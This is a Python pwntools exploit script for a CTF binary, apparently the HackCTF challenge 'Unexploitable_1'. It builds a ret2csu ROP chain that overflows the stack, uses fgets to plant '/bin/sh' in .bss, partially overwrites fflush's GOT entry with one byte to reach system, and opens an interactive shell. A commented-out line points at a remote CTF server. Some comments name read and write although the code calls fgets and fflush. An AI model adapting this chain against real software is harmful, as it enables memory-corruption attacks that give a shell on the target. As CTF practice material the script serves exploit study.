from pwn import *

context.log_level = "DEBUG"
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#p = process(["./Unexploitable_1"], env={'LD_PRELOAD':'/mnt/d/CTF/hackctf/Unexploitable_1/libc.libc.so.6'})
p = process("./Unexploitable_1")
#p = remote("ctf.j0n9hyun.xyz", 3025)
e = ELF("./Unexploitable_1")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
gdb.attach(p, "b*0x00000000004007ca")

fflush_plt = e.plt['fflush']
fflush_got = e.got['fflush']
fgets_plt = e.plt['fgets']
fgets_got = e.got['fgets']
fflush_offset = libc.symbols['fflush']
system_offset = libc.symbols['system']
main = e.symbols['main']
bss = 0x601060
binsh = "/bin/sh\x00"

log.info("fflush_offset : "+hex(fflush_offset))


csu_init = 0x4007ca
csu_call = 0x4007b0
pop_rdi = 0x4007d3
#pop_rsi_offset = 0x202e8
# rbx rbp r12   r13  r14  r15
#  0   1  func  3rd  2bd  1st

print p.recvuntil("Easy RTL ha? You even have system@plt!\n")

# csu_call(write(1, fflush_got, 8) fflush_got  Leak
"""
payload = ''
payload += "A"*24
payload += p64(csu_init)
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(ffl) # r12
payload += p64(8) # r13
payload += p64(fflush_got) # r14
payload += p64(1) # r15
payload += p64(csu_call)
"""
# rbx rbp r12   r13  r14  r15
#  0   1  func  3rd  2bd  1st
payload = ''
payload += "A"*24
# csu_call(read(0, bss+8, 8) input /bin/sh addr
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(fgets_got) # r12
payload += p64(0) # r13
payload += p64(len(binsh)) # r14
payload += p64(bss) # r15
payload += p64(csu_call)

#  csu_call(read(0, write_got, 8) got_overwirte in write
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(fgets_got) # r12
payload += p64(0) # r13
payload += p64(1) # r14
payload += p64(fflush_got) # r15
payload += p64(csu_call)

# rbx rbp r12   r13  r14  r15
#  0   1  func  3rd  2bd  1st
# csu_call(write(bss)) execute write
payload += p64(csu_init) # rsp + 8
payload += p64(0) # rbx
payload += p64(1) # rbp
payload += p64(fflush_got) # r12
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(bss) # r15
payload += p64(csu_call)

p.send(payload)


p.send(binsh)
p.send("\x51")
p.send("A"*59)
p.interactive()